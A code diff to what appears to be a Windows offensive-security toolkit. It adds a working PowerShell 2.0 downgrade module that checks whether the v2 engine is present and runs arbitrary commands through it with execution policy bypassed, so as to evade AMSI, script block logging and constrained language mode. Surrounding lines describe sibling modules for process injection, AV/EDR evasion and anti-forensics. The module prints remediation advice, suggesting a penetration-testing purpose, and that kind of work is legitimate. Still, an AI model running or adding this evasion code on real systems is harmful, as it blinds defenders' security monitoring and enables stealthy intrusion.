@@ -487,6 +487,11 @@ const PROGRAMS = {
       "Verify stealth encoding modes are working — runs a benign test command through each encoding mode (plain, base64, amsi-bypass, obfuscate) and reports which ones execute successfully. Use before real operations to confirm AV/EDR evasion readiness",
     args: "[--mode base64|amsi|obfuscate|all]",
   },
+  ps_downgrade: {
+    description:
+      "PowerShell downgrade attack — force PowerShell 2.0 engine to bypass AMSI, Script Block Logging, Constrained Language Mode, and module logging. PS 2.0 predates all modern security features. Checks if .NET 2.0/3.5 and PS 2.0 engine are available, then executes commands through the v2 engine where none of these protections exist",
+    args: "--action check|execute [--command CMD]",
+  },
   process_inject: {
     description:
       "Process injection toolkit — inject shellcode or DLLs into legitimate processes to evade AV/EDR detection. Supports process hollowing (spawn suspended → unmap → inject → resume), APC injection (queue payload to alertable thread), thread hijacking (suspend → redirect RIP/EIP → resume), early bird injection (inject before main thread init), and DLL injection via CreateRemoteThread. Enumerate injectable processes and verify injection success",
@@ -13860,6 +13865,129 @@ async function stealthCheck(args: string[], timeout: number): Promise<HookResult
   return { output: output.join("\n"), findings }
 }
 
+async function psDowngrade(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "check"
+  const command = argVal(args, "--command")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] PowerShell downgrade attack...\n"]
+
+  if (action === "check") {
+    const script = `
+Write-Output "=== PowerShell Downgrade Availability Check ==="
+Write-Output ""
+
+Write-Output "[*] Current PowerShell version: $($PSVersionTable.PSVersion)"
+Write-Output "[*] CLR version: $($PSVersionTable.CLRVersion)"
+Write-Output "[*] Language mode: $($ExecutionContext.SessionState.LanguageMode)"
+Write-Output ""
+
+$dotnet2 = Test-Path "$env:SystemRoot\\Microsoft.NET\\Framework64\\v2.0.50727" -ErrorAction SilentlyContinue
+$dotnet35 = $null -ne (Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v3.5" -ErrorAction SilentlyContinue)
+
+Write-Output "=== .NET Framework Check ==="
+Write-Output "[*] .NET 2.0 directory exists: $dotnet2"
+Write-Output "[*] .NET 3.5 installed: $dotnet35"
+
+$ps2Engine = $null
+try {
+    $ps2Engine = Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 -ErrorAction SilentlyContinue
+} catch {
+    try {
+        $ps2Engine = Get-WindowsFeature -Name PowerShell-V2 -ErrorAction SilentlyContinue
+    } catch {}
+}
+
+Write-Output ""
+Write-Output "=== PS 2.0 Engine Status ==="
+if ($ps2Engine) {
+    Write-Output "[*] PS 2.0 feature state: $($ps2Engine.State)"
+    if ($ps2Engine.State -eq 'Enabled') {
+        Write-Output "[!] VULNERABLE — PS 2.0 engine is ENABLED"
+        Write-Output ""
+        Write-Output "[*] Bypasses when using PS 2.0:"
+        Write-Output "    [!] AMSI: NOT PRESENT in PS 2.0 (introduced in PS 3.0)"
+        Write-Output "    [!] Script Block Logging: NOT PRESENT (introduced in PS 5.0)"
+        Write-Output "    [!] Constrained Language Mode: NOT PRESENT (introduced in PS 3.0)"
+        Write-Output "    [!] Module Logging: NOT PRESENT (introduced in PS 3.0)"
+        Write-Output "    [!] Transcription: LIMITED (basic, no automatic)"
+        Write-Output ""
+        Write-Output "[*] To execute: winhook ps_downgrade --action execute --command 'IEX(command)'"
+    } else {
+        Write-Output "[-] PS 2.0 engine is DISABLED — downgrade not available"
+        Write-Output "[*] Requires admin to enable: Enable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2"
+    }
+} else {
+    Write-Output "[-] Could not determine PS 2.0 status"
+    Write-Output "[*] Trying direct invocation test..."
+    $testResult = powershell.exe -Version 2 -Command "Write-Output 'PS2_OK'" 2>&1
+    if ($testResult -match 'PS2_OK') {
+        Write-Output "[!] VULNERABLE — PS 2.0 engine responds to -Version 2"
+    } else {
+        Write-Output "[-] PS 2.0 not available: $testResult"
+    }
+}
+
+Write-Output ""
+Write-Output "=== Current Security Controls ==="
+$amsi = [bool]([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.FullName -match 'Amsi' })
+Write-Output "[*] AMSI loaded: $amsi"
+
+$sbl = (Get-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" -ErrorAction SilentlyContinue).EnableScriptBlockLogging
+Write-Output "[*] Script Block Logging: $(if ($sbl) { 'ENABLED' } else { 'DISABLED/not configured' })"
+
+$ml = (Get-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" -ErrorAction SilentlyContinue).EnableModuleLogging
+Write-Output "[*] Module Logging: $(if ($ml) { 'ENABLED' } else { 'DISABLED/not configured' })"
+
+$trans = (Get-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription" -ErrorAction SilentlyContinue).EnableTranscripting
+Write-Output "[*] Transcription: $(if ($trans) { 'ENABLED' } else { 'DISABLED/not configured' })"
+
+Write-Output "[*] Language Mode: $($ExecutionContext.SessionState.LanguageMode)"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-DOWNGRADE-001",
+      provider: "windows",
+      severity: r.stdout.includes("VULNERABLE") ? "high" : "info",
+      status: r.stdout.includes("VULNERABLE") ? "VULNERABLE" : "CHECKED",
+      resource: "powershell://v2-engine",
+      title: r.stdout.includes("VULNERABLE") ? "PS 2.0 engine available — all modern protections bypassable" : "PS 2.0 engine not available",
+      details: r.stdout.substring(0, 500),
+      remediation: "Disable PS 2.0: Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2. Uninstall .NET 2.0/3.5 if not needed.",
+    })
+  }
+
+  if (action === "execute") {
+    const cmd = command || "Write-Output 'PS2 downgrade successful'; $PSVersionTable"
+    const r = await run(
+      usePwsh ? "pwsh.exe" : "powershell.exe",
+      ["-Version", "2", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", cmd],
+      timeout,
+    )
+    output.push("=== PowerShell 2.0 Downgrade Execution ===\n")
+    if (r.exitCode === 0) {
+      output.push("[+] Command executed via PS 2.0 engine (no AMSI, no SBL, no CLM)\n")
+      output.push(r.stdout)
+    } else {
+      output.push(`[-] PS 2.0 execution failed (exit code: ${r.exitCode})\n`)
+      output.push(r.stderr || r.stdout)
+    }
+    findings.push({
+      checkId: "WIN-DOWNGRADE-002",
+      provider: "windows",
+      severity: "high",
+      status: r.exitCode === 0 ? "EXECUTED" : "FAILED",
+      resource: "powershell://v2-execution",
+      title: r.exitCode === 0 ? "Command executed via PS 2.0 — bypassed all modern security controls" : "PS 2.0 downgrade execution failed",
+      details: (r.stdout || r.stderr).substring(0, 500),
+      remediation: "Disable PS 2.0 engine. Monitor Event ID 400 (Engine Lifecycle) for EngineVersion=2.0.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 async function processInject(args: string[], timeout: number): Promise<HookResult> {
   const action = argVal(args, "--action") || "enum"
   const target = argVal(args, "--target")
@@ -18391,6 +18519,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   backup_operator_abuse: backupOperatorAbuse,
   applocker_bypass: applockerBypass,
   stealth_check: stealthCheck,
+  ps_downgrade: psDowngrade,
   process_inject: processInject,
   anti_forensics: antiForensics,
 }
